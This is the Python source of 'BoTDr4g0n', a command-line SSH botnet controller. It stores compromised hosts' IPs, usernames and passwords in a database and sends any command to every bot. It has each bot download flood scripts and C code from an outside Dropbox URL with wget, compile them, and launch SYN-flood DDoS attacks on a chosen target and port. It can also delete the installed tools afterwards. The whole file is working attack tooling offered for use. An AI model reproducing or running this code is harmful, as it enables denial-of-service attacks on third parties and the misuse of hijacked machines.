#coding: utf-8
#The MIT License (MIT)
#Version 1.0
#Copyright (c) 2014 Mh4-(msfcd3r)
#by Mharcos Nesster
#Permission is hereby granted, free of charge, to any person obtaining a copy of
#this software and associated documentation files (the "Software"), to deal in
#the Software without restriction, including without limitation the rights to
#use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of
#the Software, and to permit persons to whom the Software is furnished to do so,
#subject to the following conditions:

#The above copyright notice and this permission notice shall be included in all
#copies or substantial portions of the Software.

#THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
#IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
#FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
#COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
#IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
#CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
#update 23/05/2014 beta 
import pxssh
import os
import sys
import sqlite3  
import time
from datetime import datetime
sys.path.append("Modulo/")
from AES import AESencrypt,AESdecrypt
import readline
from re import search
#---------------------------------------
BOLD = '\033[1m'
BLUE = '\033[34m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
RED = '\033[91m'
ENDC = '\033[0m'
CIANO = '\033[36m'
RES = '\033[2m'
fundociano = '\033[46m'
#--------------------------------------


def banner():
    print ("""%s
                 ))))
                 ||||       
                 |  @___oo  ------------------------------------------
       /\  /\   / (__,,,,| |              BoTDr4g0n.py    |  |        |
      ) /^\) ^\/ B)        |                             / \/ \       |
      )   /^\/   O)        |                            (/ //_ \_     |
      )   _ /  / T)        |                             \||  .  \    |
  /\  )/\/ ||  | )_)       |                       _,:__.-"/---\_ \   |
 <  >      |(,,) )N_)      |                      '~-'--.)__( , )\ \  |
  ||      /    \)_E_)\     |  by: Mh4-Msfcd3r            ,'   \)|\ `\ |
  | \____(      )_T_) )___ |Version:/x01/ copyright 2014 `   " ||   ()|
   \______(_______;;; __;;;|------------------------------------------|
     %s%s===============================================================
    | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | %s
   .-----------------------------------------------------------------.
   |Comamnd                         | description                     |
   +--------------------------------+---------------------------------+
   |use status                       List all BOT added in database;  |
   |use menu                         Show Menu Incial :D;             |
   |use create [host] [user] [pass]  Create or add a new BOT;         |
   |use add_Attack                   Add the bot to attack;           |
   |use set-command [command]        Run the command ALL BOT;         |
   |use delete_all                   Delete all BOT of Database;      |
   |use delete [id]                  Clear ID for the database;       |
   |use encrypt  [key]               Encrypt the data of the Bank;    |
   |use descrypt [key]               Descryt the data of the Bank;    |
   |use install_flood                Install all bots flood.py DDOS;  |
   |use install_g3m                  Install G3m for attack;          |
   |use attack_start [target][port]  Attack SYN flood all BOT;        |
   |use attack_g3m   [target][port]  Attack G3m website Turbo;        |
   |use kill_Attack                  Stop Attack in Target;           |
   |use clear_install                Delete all tool installed in BOT;|
   +------------------------------------------------------------------+  
"""%(RES,ENDC,GREEN,ENDC))
class Client:
    def __init__(self, host, user, password,stop):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()
        self.stop = stop
        
    def connect(self):
        try:
            self.s = pxssh.pxssh()
            self.s.login(self.host, self.user, self.password)
            print("[*] BOT Online Host:"+self.host+" %sOK%s"%(GREEN,ENDC))
            return self.s
        except Exception, e:
            Hostfaled = str(self.host)
            print("-----------------------------------------------------")
            print("[*] %sERROR%s:Check Login and Password of HOST:%s%s%s|" %(RED,ENDC,YELLOW,Hostfaled,ENDC))
            print("-----------------------------------------------------")
            f = open("Modulo/conf.bot","w")
            f.write("1")
            f.close()


        return e
    def logout(self):
        self.s.terminate(True)
        main()
 
    def send_command(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before

 
def botnetCommand(command):
    for client in botNet:
        output = client.send_command(command)
        print '[*] IP: ' + client.host
        print '[+] ' + output
        print '==================================='

def installSYN(command):
    print("[*] Install %sflood.py%s on Bots"%(YELLOW,ENDC))
    print("--------------------------------")
    for client in botNet:
        out = client.send_command(command)
        print out
    print("[*] flood.py Installed!")

def g3m(command):
    print("[*] Install %sg3m%s on Bots"%(YELLOW,ENDC))
    print("--------------------------------")
    for client in botNet:
        out = client.send_command(command)
        print out
    print("[*] flood g3m Installed!")

def attackSYN(host,porta):
    for client in botNet:
        print("[*] Starting %sattack%s wait..."%(RED,ENDC))
        print("[!] Attacking %s on port %s!"%(host,porta))
        output = client.send_command("python flood.py %s %s "%(host,porta))

def attackg3m(host,porta):
    for client in botNet:
        print("[*] Starting %sattack%s wait..."%(RED,ENDC))
        print("[!] Attacking %s on port %s!"%(host,porta))
        output = client.send_command("gcc -o flood g3m.c")
        output = client.send_command("./flood -h %s -T 3 -p %s,%s "%(host,porta,porta))

def clear():
    for client in botNet:
        print("[*] clear tool for attack of  %sServer%s"%(RED,ENDC))
        print("[!] Delete all tool installed!")
        output = client.send_command("rm flood")
        print output
        output = client.send_command("rm g3m.c")
        print output
        output = client.send_command("rm flood.py")
        print output
 
def desconnect():
    for client in botNet:
        print("[*] Stop Attack  %sServer%s"%(RED,ENDC))
        print("[%sOK%s] Desconnect all BOT!"%(GREEN,ENDC))
        aut = client.logout()


def addClient(host, user, password):
    stop = 0
    f2 = open("Modulo/conf.bot","w")
    f2.write("2")
    f2.close()
    client = Client(host, user, password,stop)
    f = open("Modulo/conf.bot","r")
    guns = f.read()
    if search("1",guns):
        print("[*] %sERROR%s: Offline %sBOT%s:%s%s%s"%(RED,ENDC,YELLOW,ENDC,BLUE,host,ENDC))
    if search("2",guns):
        botNet.append(client)
    f.close()




def criartabela():
    c.execute("CREATE TABLE IF NOT EXISTS database_bot (id integer PRIMARY KEY AUTOINCREMENT, ipadress text, usuario text,datestamp text, senha text)")
    banner()

def inserir_db(ipadress,usuario,senha):
    data_tempo = str(datetime.fromtimestamp(int(time.time())).strftime("%Y-%m-%d %H:%M:%S"))
    c.execute("INSERT INTO database_bot (ipadress,usuario,datestamp,senha) VALUES(?,?,?,?)",(ipadress,usuario,data_tempo,senha))
    conexao.commit()

def status_bot():
    cursor = c.execute("SELECT id,ipadress,usuario,senha,datestamp FROM database_bot")
    teste = 0
    for row in cursor:
        teste = teste + 1
        print("--------------------------------------------------------------------------------------")
        print("|ID: " + str(row[0]) +"|" + " IPADRESS: " + str(row[1]) +"|"  +  " User: " + str(row[2])+"|"  + " Password: " +str(row[3]) +"|"  + " Data: " + str(row[4]) + "|")
        print("--------------------------------------------------------------------------------------")
    
    return cont_bot(teste)

def cont_bot(teste):
    print("\n---------------------")
    print("[*] Database BOT: %s%s%s"%(YELLOW,teste,ENDC))
    if teste == 0:
        zerarid()
    return teste
def add_bot():
    cursor = c.execute("SELECT id,ipadress,usuario,senha FROM database_bot")
    for row in cursor:
        addClient(row[1], row[2], row[3])

def add_bot2():
    cursor = c.execute("SELECT id,ipadress,usuario,senha FROM database_bot")
    for row in cursor:
        desconectar(row[1], row[2], row[3])
        
def delete_bot(n):
    print("[*] Deleted all BOT in DB!")
    num = 0
    for num in range(n):
        c.execute("DELETE FROM database_bot WHERE id= %s"%(num))
    conexao.commit()

def deleteum(n):
    print("[*] Querying table")
    cursor = c.execute("SELECT id,ipadress,usuario,senha FROM database_bot where id= %d"%(n))
    for row in cursor:
        print("[*] DELETE: IP:%s User:%s Password:%s"%(row[1], row[2], row[3]))
    c.execute("DELETE FROM database_bot WHERE id= %d"%(n))
    conexao.commit()
    print"[*] DELETE BOT ID: %d"%n 
def zerarid():
    #c.execute("DROP TABLE database_bot")
    c.execute("UPDATE SQLITE_SEQUENCE set seq=0 WHERE name=\"database_bot\"")
    conexao.commit()
    print("[*] Reset all ID!")

conexao =  sqlite3.connect("Modulo/database.db")
c = conexao.cursor()
criartabela()

botNet = []


def muda():
    print("invalid command!")

def main():
    escolha = {"use kill_Attack": desconnect,"use menu": banner,"use add_Attack": add_bot, "use status": status_bot, "use delete_all": delete_bot, "use set-command" : comando_bot}
    while True:
        COMMANDS = ['desconnect','menu','add_Attack','clear_install','install_g3m','attack_g3m','attack_start','install_flood','use','delete', 'status', 'delete_all', 'set-command','create', 'encrypt' , 'descrypt','clear']

        def complete(text, state):
            for cmd in COMMANDS:
                if cmd.startswith(text):
                    if not state:
                        return cmd
                    else:
                        state -= 1

        readline.parse_and_bind("tab: complete")
        readline.set_completer(complete)
        selecao = raw_input("::%sDr4g0n%s(%sBOTSSH%s)>"%(CIANO,ENDC,RED,ENDC))
        if "sair" == selecao:
            return
        tudo = escolha.get(selecao, muda)
        if search("use add",str(selecao)):
            add_bot()

        elif search("use delete_all", selecao):
            n = status_bot()
            n = n + 10
            delete_bot(n)
            main()

        elif search("use attack_start",selecao):
            at = selecao[10:]
            at = map(str, selecao.split())
            target =  at[2]
            porta = at[3]
            attackSYN(target,porta)

        elif search("use attack_g3m",selecao):
            at = selecao[14:]
            at = map(str, selecao.split())
            target =  at[2]
            porta = at[3]
            attackg3m(target,porta)    

        elif search("use install_flood",selecao):
            comando = "wget https://dl.dropboxusercontent.com/u/97321327/flood.py"
            installSYN(comando)
        elif search("use install_g3m",selecao):
            comando = "wget https://dl.dropboxusercontent.com/u/97321327/g3m.c"
            g3m(comando)

        elif search("use attack_stop", selecao):
            add_bot2()

        elif search("use clear_install",selecao):
            clear()

        elif search("use encrypt", selecao):
            key = selecao[11:]
            key = map(str, selecao.split())
            encrytdata_base(key[2])

        elif search("use descrypt", selecao):
            key = selecao[12:]
            key = map(str, selecao.split())
            descrytdata_base(key[2])

        elif selecao == "clear":
            os.system(selecao)
            banner()
            main()

        elif search("use set-command", selecao):
            bot = selecao[15:]
            comando_bot(bot)
            main()

        elif search("use create", selecao):
            bot = selecao[10:]
            bot = map(str, selecao.split())
            confadd_bot(bot[2],bot[3],bot[4])
            status_bot()

        elif search("use delete",selecao):
            delete = selecao[10:]
            delete = map(str, selecao.split())
            deleteum(int(delete[2]))
        else:
            tudo()
            main()

def encrytdata_base(key):
    f = open("Modulo/database.db", "rb")
    encryt = f.read()
    a = AESencrypt(key, encryt)
    print("[*] encrypting File!")
    encryt = open("Modulo/database.db", "wb")
    encryt.write(a)
    print("[*] File encryted in %sModulo/database.db%s"%(RED,ENDC))
    encryt.close()
    f.close()

def descrytdata_base(key):
    f = open("Modulo/database.db", "rb")
    encryt = f.read()
    a = AESdecrypt(key, encryt)
    print("[*] Descryting file!")
    encryt = open("Modulo/database.db", "wb")
    encryt.write(a)
    print("[*] File Descryted in %sModulo/database.db%s"%(RED,ENDC))
    encryt.close()
    f.close()

def comando_bot(comando):
    botnetCommand(comando)

def confadd_bot(ipadress,user,password):
    banner()
    inserir_db(ipadress,user,password)

if __name__ == "__main__":
    if not os.geteuid()==0:
        sys.exit("\nOnly root can run this script\n")
    main()
    conexao.close()
